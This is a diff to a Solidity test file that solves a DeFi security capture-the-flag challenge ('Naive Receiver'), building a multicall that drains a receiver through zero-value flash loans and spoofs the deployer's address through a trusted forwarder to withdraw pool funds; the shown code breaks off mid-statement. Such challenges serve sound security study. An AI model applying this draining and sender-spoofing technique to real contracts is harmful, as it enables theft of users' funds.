@@ -82,18 +82,12 @@ contract NaiveReceiverChallenge is Test {
         // build multicall data array to drain reciever and pool
         bytes[] memory multicallData = new bytes[](11);
         // drain the receiver contract by taking out 10 flash loans of no value which will approve and send their entire balance (10 weth) to the pool contract as fee payments
+        // so add all 10 flash loans to to multicall data array
         for (uint256 i = 0; i < 10; i++) {
             multicallData[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "");
         }
-
-        // this simple approach did not work
-        // pool.deposits(address(pool)) = 0 here so calling withdraw wont work, even though that would be easiest
-        // uint256 amount = weth.balanceOf(address(pool));
-        // multicallData[10] = abi.encodeWithSelector(pool.withdraw.selector, amount, recovery);
-        // pool.multicall(multicallData);
-
         // Calling multicall directly doesnt seem to be the solution since we need the withdraw call to go through the fowarder and we need to keep total txs down to pass challenge
-        // to get arround this I can encode the multicall itself into a request and send that with 10 flashloans and the withdraw all in one request
+        // to get arround this we can encode the multicall itself into a request and send that with 10 flashloans and the withdraw all in one request
         // Need to go through the fowarder since the NativeReceiverPool::_msgSender can be tricked if the call comes from the fowarder
         // encode withdraw function call with deployer address at the end to trick NativeReceiverPool::_msgSender into thinking deployer is calling withdraw
         multicallData[10] =
